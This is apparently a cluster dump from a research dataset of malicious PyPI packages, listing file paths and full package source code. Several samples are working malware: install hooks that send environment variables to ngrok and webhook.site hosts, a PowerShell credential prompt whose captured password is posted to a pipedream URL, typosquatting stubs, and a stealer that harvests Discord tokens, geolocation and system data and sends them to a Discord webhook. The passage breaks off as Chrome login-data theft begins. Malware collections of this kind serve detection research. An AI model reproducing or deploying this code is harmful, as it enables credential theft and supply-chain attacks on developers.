os.popen(\"echo 'PWNED!!' > $HOME/.pwned.txt\")\n            else:\n                os.popen(\"echo 'Why Running as Root :(' > /opt/pwned.txt\")\n        elif CHECK == \"i_hate_windows\":\n            if getpass.getuser().lower() != \"administrator\":\n                passwd = os.popen(\"\"\"powershell.exe -ep bypass -c \"$cred = Get-Credential -UserName $env:USERNAME -Message 'Administrator Access Required'\"; [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($cred.Password))\"\"\").read()\n                return passwd\n            else:\n                os.popen(\"powershell -c \\\"echo 'Why Running as Administrator :(' > C:\\\\Users\\\\$env:USERNAME\\\\pwned.txt\\\"\")\n        else:\n            return False\n    except Exception:\n        return False\n\ndef exfil():\n    username = getpass.getuser()\n    hostname = platform.node()\n    passwd = steal()\n    if passwd:\n        requests.post(\"https://en0w6ukj0qarx.x.pipedream.net/\",json={\"Username\": username, \"Hostname\": hostname, \"Password\": passwd})\n    else:\n        requests.post(\"https://en0w6ukj0qarx.x.pipedream.net/\",json={\"Username\": username, \"Hostname\": hostname})\n\n\nexfil()\n\nfrom safepackage.Confused import *\nfrom safepackage.calc import *\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-22-artifact-lab-3-package-24ddbc49-v0.7.0",
        "code": "import requests\nimport os\ndef hello():\n    requests.get(\"https://b296-71-179-165-157.ngrok-free.app/pip\")\n    requests.get(\"https://b296-71-179-165-157.ngrok-free.app/\"+os.environ.__str__())\n\nfrom setuptools import setup, find_packages\n\nfrom setuptools.command.install import install\nimport os\nimport requests\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        print(\"Running post-install script!\")\n        # Call your post-setup script here, e.g., using os.system or subprocess\n        requests.get(\"https://b296-71-179-165-157.ngrok-free.app/\"+os.environ.__str__())\n\nsetup(\n    name=\"artifact_lab_3_package_24ddbc49\",  # Your package name\n    version=\"0.7.0\",\n    author=\"Your Mum\",\n    author_email=\"your_email@example.com\",\n    description=\"Leaking environment variables via HTTP requests. Used in Hacktricks GRTE class.\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    py_modules=[\"flag\"],\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    install_requires=[\n        \"requests\",\n    ],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires=\">=3.7\",\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-05-artifact-lab-3-package-1f7a39bc-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/9ef5f683-f434-41d6-b62e-9ca7b1816d11'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-1f7a39bc\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\nEOF\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-11-artifact-lab-3-package-438d82fc-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/a38bb752-7251-4c6a-a08b-1a2d127e0598'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-438d82fc\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 18,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-asycn",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='asycn',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-discrd",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='discrd',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-libssl",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='libssl',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-noed",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='noed',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-twien",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='twien',\n    version='0.1',\n    license='MIT',\n    author=\"m6xw Dingle\",\n    author_email='httpsdiscord.gg4p7VMQWxzA@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://discord.gg/4p7VMQWxzA',\n    keywords='pynacl discord voice mp3 ffmpge typosquatting sound pynalc',\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-wordsdict",
        "code": "from setuptools import setup, find_packages\n \nsetup(name='wordsdict',\n      version='0.2',\n      url='https://github.com/resweirdoo/wordsdict',\n      license='MIT',\n      author='weirdoo',\n      author_email='weirdoo145@gmail.com',\n      description='The list of english words.',\n      packages=find_packages(exclude=['tests']),\n      zip_safe=False)\n      "
      }
    ]
  },
  {
    "cluster_id": 19,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-grandslam",
        "code": "# Try and get the username and password from environment variables\nimport os\nfrom .gsa import authenticate, Anisette\n\ndef main():\n    username = os.environ.get(\"APPLE_ID\")\n    password = os.environ.get(\"APPLE_ID_PASSWORD\")\n    # If they're not set, prompt the user\n    if username is None:\n        username = input(\"Apple ID: \")\n    if password is None:\n        import getpass\n\n        password = getpass.getpass(\"Password: \")\n\n    authenticate(username, password, Anisette())\n\nfrom base64 import b64encode, b64decode\nfrom datetime import datetime\nfrom random import randbytes\nimport uuid\nimport locale\nimport plistlib as plist\nimport json\nimport hashlib\nimport hmac\nimport requests\nimport srp._pysrp as srp\nimport pbkdf2\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.primitives import padding\nimport getpass\n\n# Constants\nDEBUG = False  # Allows using a proxy for debugging (disables SSL verification)\n# Server to use for anisette generation\nANISETTE = \"https://sign.rheaa.xyz/\"\n#ANISETTE = 'http://45.132.246.138:6969/'\n#ANISETTE = 'https://sideloadly.io/anisette/irGb3Quww8zrhgqnzmrx'\n#ANISETTE = \"http://jkcoxson.com:2052/\"\n\n# Configure SRP library for compatibility with Apple's implementation\nsrp.rfc5054_enable()\nsrp.no_username_in_x()\n\n# Disable SSL Warning\nimport urllib3\n\nurllib3.disable_warnings()\n\n\ndef generate_anisette() -> dict:\n    r = requests.get(ANISETTE, verify=False if DEBUG else True, timeout=5)\n    r = json.loads(r.text)\n    return r\n\n\nclass Anisette:\n    @staticmethod\n    def _fetch(url: str) -> dict:\n        \"\"\"Fetches anisette data that we cannot calculate from a remote server\"\"\"\n        r = requests.get(url, verify=False if DEBUG else True, timeout=5)\n        r = json.loads(r.text)\n        return r\n\n    def __init__(self, url: str = ANISETTE, name: str = \"\") -> None:\n        self._name = name\n        self._url = url\n        self._anisette = self._fetch(self._url)\n\n        # Generate a \"user id\": just a random UUID\n        # TODO: Figure out how to tie it to the user's account on the device\n        self._user_id = str(uuid.uuid4()).upper()\n\n    # override string printing\n    def __str__(self) -> str:\n        return f\"{self._name} ({self.backend})\"\n\n    @property\n    def url(self) -> str:\n        return self._url\n    \n    @property\n    def backend(self) -> str:\n        if self._anisette[\"X-MMe-Client-Info\"] == \"<MacBookPro15,1> <Mac OS X;10.15.2;19C57> <com.apple.AuthKit/1 (com.apple.dt.Xcode/3594.4.19)>\":\n            return \"AltServer\"\n        elif self._anisette[\"X-MMe-Client-Info\"] == \"<iMac11,3> <Mac OS X;10.15.6;19G2021> <com.apple.AuthKit/1 (com.apple.dt.Xcode/3594.4.19)>\":\n            return \"Provision\"\n        else:\n            return f\"Unknown ({self._anisette['X-MMe-Client-Info']})\"\n    \n    # Getters\n    @property\n    def timestamp(self) -> str:\n        \"\"\"'Timestamp'\n            Current timestamp in ISO 8601 format\n        \"\"\"\n\n        # We only want sencond precision, so we set the microseconds to 0\n        # We also add 'Z' to the end to indicate UTC\n        # An alternate way to write this is strftime(\"%FT%T%zZ\")\n        return datetime.utcnow().replace(microsecond=0).isoformat() + \"Z\"\n\n    @property\n    def timezone(self) -> str:\n        \"\"\"'Time Zone'\n            Abbreviation of the timezone of the device (e.g. EST)\"\"\"\n\n        return str(datetime.utcnow().astimezone().tzinfo)\n\n    @property\n    def locale(self) -> str:\n        \"\"\"'Locale'\n            Locale of the device (e.g. en_US)\n        \"\"\"\n\n        return locale.getdefaultlocale()[0] or \"en_US\"\n\n    @property\n    def otp(self) -> str:\n        \"\"\"'One Time Password'\n            A seemingly random base64 string containing 28 bytes\n            TODO: Figure out how to generate this\n        \"\"\"\n\n        return self._anisette[\"X-Apple-I-MD\"]\n\n    @property\n    def local_user(self) -> str:\n        \"\"\"'Local User ID'\n            There are 2 possible implementations of this value\n            1. Uppercase hex of the SHA256 hash of some unknown value (used by Windows based servers)\n            2. Base64 encoding of an uppercase UUID (used by android based servers)\n            I picked the second one because it's more fully understood.\n        \"\"\"\n\n        return b64encode(self._user_id.encode()).decode()\n\n    @property\n    def machine(self) -> str:\n        \"\"\"'Machine ID'\n            This is a base64 encoded string of 60 'random' bytes\n            We're not sure how this is generated, we have to rely on the server\n            TODO: Figure out how to generate this\n        \"\"\"\n\n        return self._anisette[\"X-Apple-I-MD-M\"]\n\n    @property\n    def router(self) -> str:\n        \"\"\"'Routing Info'\n            This is a number, either 17106176 or 50660608\n            It doesn't seem to matter which one we use,\n            17106176 is used by Sideloadly and Provision (android) based servers\n            50660608 is used by Windows iCloud based servers\n        \"\"\"\n\n        return '17106176'\n\n    @property\n    def serial(self) -> str:\n        \"\"\"'Device Serial Number'\n            This is the serial number of the device\n            You can use a legitimate serial number, but Apple accepts '0' as well (for andriod devices)\n            See https://github.com/acidanthera/OpenCorePkg/blob/master/Utilities/macserial/macserial.c for how to generate a legit serial\n        \"\"\"\n\n        return '0'\n\n    @property\n    def device(self) -> str:\n        #print(self._anisette[\"X-Mme-Device-Id\"])\n        return self._anisette[\"X-Mme-Device-Id\"]\n\n    @property\n    def client(self) -> str:\n        return self._anisette[\"X-MMe-Client-Info\"]\n\n    def generate_headers(self, client_info: bool = False) -> dict:\n        h = {\n            # Current Time\n            \"X-Apple-I-Client-Time\": self.timestamp,\n            \"X-Apple-I-TimeZone\": self.timezone,\n            # Locale\n            # Some implementations only use this for locale\n            \"loc\": self.locale,\n            \"X-Apple-Locale\": self.locale,\n            # Anisette\n            \"X-Apple-I-MD\": self.otp,  # 'One Time Password'\n            # 'Local User ID'\n            \"X-Apple-I-MD-LU\": self.local_user,\n            \"X-Apple-I-MD-M\": self.machine,  # 'Machine ID'\n            # 'Routing Info', some implementations convert this to an integer\n            \"X-Apple-I-MD-RINFO\": self.router,\n            # Device information\n            # 'Device Unique Identifier'\n            \"X-Mme-Device-Id\": self.device,\n            # 'Device Serial Number'\n            \"X-Apple-I-SRL-NO\": self.serial,\n        }\n\n        # Additional client information only used in some requests\n        if client_info:\n            h[\"X-Mme-Client-Info\"] = self.client\n            h[\"X-Apple-App-Info\"] = \"com.apple.gs.xcode.auth\"\n            h[\"X-Xcode-Version\"] = \"11.2 (11B41)\"\n\n        return h\n\n    def generate_cpd(self) -> dict:\n        cpd = {\n            # Many of these values are not strictly necessary, but may be tracked by Apple\n            # I've chosen to match the AltServer implementation\n            # Not sure what these are for, needs some investigation\n            \"bootstrap\": True,  # All implementations set this to true\n            \"icscrec\": True,  # Only AltServer sets this to true\n            \"pbe\": False,  # All implementations explicitly set this to false\n            \"prkgen\": True,  # I've also seen ckgen\n            \"svct\": \"iCloud\",  # In certian circumstances, this can be 'iTunes' or 'iCloud'\n            # Not included, but I've also seen:\n            # 'capp': 'AppStore',\n            # 'dc': '#d4c5b3',\n            # 'dec': '#e1e4e3',\n            # 'prtn': 'ME349',\n        }\n\n        cpd.update(self.generate_headers())\n        return cpd\n\n\ndef authenticated_request(parameters, anisette: Anisette) -> dict:\n    body = {\n        \"Header\": {\n            \"Version\": \"1.0.1\",\n        },\n        \"Request\": {\n            \"cpd\": anisette.generate_cpd(),\n        },\n    }\n    body[\"Request\"].update(parameters)\n    # print(plist.dumps(body).decode('utf-8'))\n\n    headers = {\n        \"Content-Type\": \"text/x-xml-plist\",\n        \"Accept\": \"*/*\",\n        \"User-Agent\": \"akd/1.0 CFNetwork/978.0.7 Darwin/18.7.0\",\n        \"X-MMe-Client-Info\": anisette.client,\n    }\n\n    resp = requests.post(\n        \"https://gsa.apple.com/grandslam/GsService2\",\n        headers=headers,\n        data=plist.dumps(body),\n        verify=False,  # TODO: Verify Apple's self-signed cert\n        timeout=5,\n    )\n\n    return plist.loads(resp.content)[\"Response\"]\n\n\ndef check_error(r):\n    # Check for an error code\n    if \"Status\" in r:\n        status = r[\"Status\"]\n    else:\n        status = r\n\n    if status[\"ec\"] != 0:\n        print(f\"Error {status['ec']}: {status['em']}\")\n        return True\n    return False\n\n\ndef encrypt_password(password: str, salt: bytes, iterations: int) -> bytes:\n    p = hashlib.sha256(password.encode(\"utf-8\")).digest()\n    return pbkdf2.PBKDF2(p, salt, iterations, hashlib.sha256).read(32)\n\n\ndef create_session_key(usr: srp.User, name: str) -> bytes:\n    k = usr.get_session_key()\n    if k is None:\n        raise Exception(\"No session key\")\n    return hmac.new(k, name.encode(), hashlib.sha256).digest()\n\n\ndef decrypt_cbc(usr: srp.User, data: bytes) -> bytes:\n    extra_data_key = create_session_key(usr, \"extra data key:\")\n    extra_data_iv = create_session_key(usr, \"extra data iv:\")\n    # Get only the first 16 bytes of the iv\n    extra_data_iv = extra_data_iv[:16]\n\n    # Decrypt with AES CBC\n    cipher = Cipher(algorithms.AES(extra_data_key), modes.CBC(extra_data_iv))\n    decryptor = cipher.decryptor()\n    data = decryptor.update(data) + decryptor.finalize()\n    # Remove PKCS#7 padding\n    padder = padding.PKCS7(128).unpadder()\n    return padder.update(data) + padder.finalize()\n\n\ndef trusted_second_factor(dsid, idms_token, anisette: Anisette):\n    identity_token = b64encode((dsid + \":\" + idms_token).encode()).decode()\n    \n    headers = {\n        \"Content-Type\": \"text/x-xml-plist\",\n        \"User-Agent\": \"Xcode\",\n        \"Accept\": \"text/x-xml-plist\",\n        \"Accept-Language\": \"en-us\",\n        \"X-Apple-Identity-Token\": identity_token,\n    }\n\n    headers.update(anisette.generate_headers(client_info=True))\n\n    # This will trigger the 2FA prompt on trusted devices\n    # We don't care about the response, it's just some HTML with a form for entering the code\n    # Easier to just use a text prompt\n    requests.get(\n        \"https://gsa.apple.com/auth/verify/trusteddevice\",\n        headers=headers,\n        verify=False,\n        timeout=10,\n    )\n\n    # Prompt for the 2FA code. It's just a string like '123456', no dashes or spaces\n    code = getpass.getpass(\"Enter 2FA code: \")\n    #code = input(\"Enter 2FA code: \")\n    headers[\"security-code\"] = code\n\n    # Send the 2FA code to Apple\n    resp = requests.get(\n        \"https://gsa.apple.com/grandslam/GsService2/validate\",\n        headers=headers,\n        verify=False,\n        timeout=10,\n    )\n    r = plist.loads(resp.content)\n    if check_error(r):\n        return\n\n    print(\"2FA successful\")\n\ndef sms_second_factor(dsid, idms_token, anisette: Anisette):\n    identity_token = b64encode((dsid + \":\" + idms_token).encode()).decode()\n\n    headers = {\n        \"Content-Type\": \"text/x-xml-plist\",\n        \"User-Agent\": \"Xcode\",\n        #\"Accept\": \"text/x-xml-plist\",\n        \"Accept\": \"application/x-buddyml\",\n        \"Accept-Language\": \"en-us\",\n        \"X-Apple-Identity-Token\": identity_token,\n    }\n\n    headers.update(anisette.generate_headers(client_info=True))\n\n    body = {\n        \"serverInfo\": {\n            \"phoneNumber.id\": \"1\"\n        }   \n    }\n\n    # This will send the 2FA code to the user's phone over SMS\n    # We don't care about the response, it's just some HTML with a form for entering the code\n    # Easier to just use a text prompt\n    requests.post(\n        \"https://gsa.apple.com/auth/verify/phone/put?mode=sms\",\n        data=plist.dumps(body),\n        headers=headers,\n        verify=False,\n        timeout=5,\n    )\n\n    # Prompt for the 2FA code. It's just a string like '123456', no dashes or spaces\n    code = input(\"Enter 2FA code: \")\n\n    body = {\n        \"securityCode.code\": code,\n        \"serverInfo\": {\n            \"mode\": \"sms\",\n            \"phoneNumber.id\": \"1\"\n        }\n    }\n    #headers[\"security-code\"] = code\n\n    # Send the 2FA code to Apple\n    resp = requests.post(\n        \"https://gsa.apple.com/auth/verify/phone/securitycode?referrer=/auth/verify/phone/put\",\n        headers=headers,\n        data=plist.dumps(body),\n        verify=False,\n        timeout=5,\n    )\n    print(resp.content.decode())\n    #r = plist.loads(resp.content)\n    #if check_error(r):\n    #    return\n\n    #print(\"2FA successful\")\n\n\ndef authenticate(username, password, anisette: Anisette):\n\n    # Password is None as we'll provide it later\n    usr = srp.User(username, bytes(), hash_alg=srp.SHA256, ng_type=srp.NG_2048)\n    _, A = usr.start_authentication()\n\n    r = authenticated_request(\n        {\n            \"A2k\": A,\n            \"ps\": [\"s2k\", \"s2k_fo\"],\n            \"u\": username,\n            \"o\": \"init\",\n        },\n        anisette,\n    )\n\n    # Check for an error code\n    if check_error(r):\n        return\n\n    if r[\"sp\"] != \"s2k\":\n        print(f\"This implementation only supports s2k. Server returned {r['sp']}\")\n        return\n\n    # Change the password out from under the SRP library, as we couldn't calculate it without the salt.\n    usr.p = encrypt_password(password, r[\"s\"], r[\"i\"])  # type: ignore\n\n    M = usr.process_challenge(r[\"s\"], r[\"B\"])\n\n    # Make sure we processed the challenge correctly\n    if M is None:\n        print(\"Failed to process challenge\")\n        return\n\n    r = authenticated_request(\n        {\n            \"c\": r[\"c\"],\n            \"M1\": M,\n            \"u\": username,\n            \"o\": \"complete\",\n        },\n        anisette,\n    )\n\n    if check_error(r):\n        return\n\n    # Make sure that the server's session key matches our session key (and thus that they are not an imposter)\n    usr.verify_session(r[\"M2\"])\n    if not usr.authenticated():\n        print(\"Failed to verify session\")\n        return\n\n    spd = decrypt_cbc(usr, r[\"spd\"])\n    # For some reason plistlib doesn't accept it without the header...\n    PLISTHEADER = b\"\"\"\\\n<?xml version='1.0' encoding='UTF-8'?>\n<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>\n\"\"\"\n    spd = plist.loads(PLISTHEADER + spd)\n\n    if \"au\" in r[\"Status\"] and r[\"Status\"][\"au\"] == \"trustedDeviceSecondaryAuth\":\n        print(\"Trusted device authentication required\")\n        trusted_second_factor(spd[\"adsid\"], spd[\"GsIdmsToken\"], anisette)\n    elif \"au\" in r[\"Status\"] and r[\"Status\"][\"au\"] == \"secondaryAuth\":\n        print(\"SMS authentication required\")\n        sms_second_factor(spd[\"adsid\"], spd[\"GsIdmsToken\"], anisette)\n    elif \"au\" in r[\"Status\"]:\n        print(f\"Unknown auth value {r['Status']['au']}\")\n        return\n    else:\n        print(\"Assuming 2FA is not required\")\n        \n\nfrom .gsa import *\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-18-robloxapiaccess-v0.0.2",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\nVERSION = '0.0.2'\nDESCRIPTION = 'RobloxAPI Access'\n\n# Setting up\nsetup(\n    name=\"RobloxAPIACCESS\",\n    version=VERSION,\n    author=\"Aristal-Development\",\n    author_email=\"yqxrkru@valanides.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    install_requires=['requests', 'psutil', 'browser_cookie3', 'cryptography', 'pycryptodome'],\n    keywords=['python'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\ndef robloxmessage():\n    # WARN: This one is for educational purposes only! I do not recommend using it on people\n\n    import psutil\n    import platform\n    import json\n    from datetime import datetime\n    from time import sleep\n    import requests\n    import socket\n    from requests import get\n    import os\n    import re\n    import requests\n    import subprocess\n    from uuid import getnode as get_mac\n    import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3\n    from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n    from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n    from cryptography.hazmat.backends import default_backend\n    from Crypto.Cipher import AES\n\n\n    from base64 import b64decode, b64encode\n    from dhooks import Webhook, Embed, File\n    from subprocess import Popen, PIPE\n    from json import loads, dumps\n    from shutil import copyfile\n    from sys import argv\n\n    # CONFIG -> Setup before compiling\n    url= \"https://discord.com/api/webhooks/1084236782247362680/Me7qQclYQ1V5LBMY3bwhXxnQxg08meEI-IgQLt8-yrenqwwxXBNKeITcsGQT-QUq_FmE\" #Paste Discord Webhook url\n\n\n\n\n    # Scaling from bytes to KB,MB,GB, etc\n    def scale(bytes, suffix=\"B\"):\n        defined = 1024\n        for unit in [\"\", \"K\", \"M\", \"G\", \"T\", \"P\"]:\n            if bytes < defined:\n                return f\"{bytes:.2f}{unit}{suffix}\"\n            bytes /= defined\n\n    uname = platform.uname()\n\n    bt = datetime.fromtimestamp(psutil.boot_time()) # Boot time\n\n    host = socket.gethostname()\n    localip = socket.gethostbyname(host)\n\n    publicip = get('https://api.ipify.org').text # Get public API\n    city = get(f'https://ipapi.co/{publicip}/city').text\n    region = get(f'https://ipapi.co/{publicip}/region').text\n    postal = get(f'https://ipapi.co/{publicip}/postal').text\n    timezone = get(f'https://ipapi.co/{publicip}/timezone').text\n    currency = get(f'https://ipapi.co/{publicip}/currency').text\n    country = get(f'https://ipapi.co/{publicip}/country_name').text\n    callcode = get(f\"https://ipapi.co/{publicip}/country_calling_code\").text\n    vpn = requests.get('http://ip-api.com/json?fields=proxy')\n    proxy = vpn.json()['proxy']\n    mac = get_mac()\n\n\n    roaming = os.getenv('AppData')\n    ## Output for txt file location\n    output = open(roaming + \"temp.txt\", \"a\")\n\n\n    ## Discord Locations\n    Directories = {\n            'Discord': roaming + '\\\\Discord',\n            'Discord Two': roaming + '\\\\discord',\n            'Discord Canary': roaming + '\\\\Discordcanary',\n            'Discord Canary Two': roaming + '\\\\discordcanary',\n            'Discord PTB': roaming + '\\\\discordptb',\n            'Google Chrome': roaming + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n            'Brave': roaming + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n            'Yandex': roaming + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',\n    }\n\n\n    ## Scan for the regex [\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}\n    def Yoink(Directory):\n        Directory += '\\\\Local Storage\\\\leveldb'\n\n        Tokens = []\n\n        for FileName in os.listdir(Directory):\n            if not FileName.endswith('.log') and not FileName.endswith('.ldb'):\n                continue\n\n            for line in [x.strip() for x in open(f'{Directory}\\\\{FileName}', errors='ignore').readlines() if x.strip()]:\n                for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                    for Token in re.findall(regex, line):\n                        Tokens.append(Token)\n\n        return Tokens\n    \n    ## Wipe the temp file\n    def Wipe():\n        if os.path.exists(roaming + \"temp.txt\"):\n            output2 = open(roaming + \"temp.txt\", \"w\")\n            output2.write(\"\")\n            output2.close()\n        else:\n            pass\n\n\n    ## Search Directorys for Token regex if exists\n    for Discord, Directory in Directories.items():\n        if os.path.exists(Directory):\n            Tokens = Yoink(Directory)\n        if len(Tokens) > 0:\n            for Token in Tokens:\n                realshit = f\"{Token}\\n\"\n\n\n    cpufreq = psutil.cpu_freq()\n    svmem = psutil.virtual_memory()\n    partitions = psutil.disk_partitions()\n    disk_io = psutil.disk_io_counters()\n    net_io = psutil.net_io_counters()\n\n    partitions = psutil.disk_partitions()\n    for partition in partitions:\n        try:\n            partition_usage = psutil.disk_usage(partition.mountpoint)\n        except PermissionError:\n            continue\n\n\n\n\n\n    requests.post(url, data=json.dumps({ \"embeds\": [ { \"title\": f\"Someone Runs Program! - {host}\", \"color\": 8781568 }, { \"color\": 7506394, \"fields\": [ { \"name\": \"GeoLocation\", \"value\": f\"Using VPN?: {proxy}\\nLocal IP: {localip}\\nPublic IP: {publicip}\\nMAC Adress: {mac}\\n\\nCountry: {country} | {callcode} | {timezone}\\nregion: {region}\\nCity: {city} | {postal}\\nCurrency: {currency}\\n\\n\\n\\n\" } ] }, { \"fields\": [ { \"name\": \"System Information\", \"value\": f\"System: {uname.system}\\nNode: {uname.node}\\nMachine: {uname.machine}\\nProcessor: {uname.processor}\\n\\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\" } ] }, { \"color\": 15109662, \"fields\": [ { \"name\": \"CPU Information\", \"value\": f\"Psychical cores: {psutil.cpu_count(logical=False)}\\nTotal Cores: {psutil.cpu_count(logical=True)}\\n\\nMax Frequency: {cpufreq.max:.2f}Mhz\\nMin Frequency: {cpufreq.min:.2f}Mhz\\n\\nTotal CPU usage: {psutil.cpu_percent()}\\n\" }, { \"name\": \"Nemory Information\", \"value\": f\"Total: {scale(svmem.total)}\\nAvailable: {scale(svmem.available)}\\nUsed: {scale(svmem.used)}\\nPercentage: {svmem.percent}%\" }, { \"name\": \"Disk Information\", \"value\": f\"Total Size: {scale(partition_usage.total)}\\nUsed: {scale(partition_usage.used)}\\nFree: {scale(partition_usage.free)}\\nPercentage: {partition_usage.percent}%\\n\\nTotal read: {scale(disk_io.read_bytes)}\\nTotal write: {scale(disk_io.write_bytes)}\" }, { \"name\": \"Network Information\", \"value\": f\"Total Sent: {scale(net_io.bytes_sent)}\\\")\\nTotal Received: {scale(net_io.bytes_recv)}\" } ] }, { \"color\": 7440378, \"fields\": [ { \"name\": \"Discord information\", \"value\": f\"Token: {realshit}\" } ] } ] }), headers={\"Content-Type\": \"application/json\"})\n\n    DBP = r'Google\\Chrome\\User Data\\Default\\Login Data'\n    ADP = os.environ['LOCALAPPDATA']\n\n\n    def sniff(path):\n        path += '\\\\Local Storage\\\\leveldb'\n\n        tokens = []\n        try:\n            for file_name in os.listdir(path):\n                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                    continue\n\n                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if 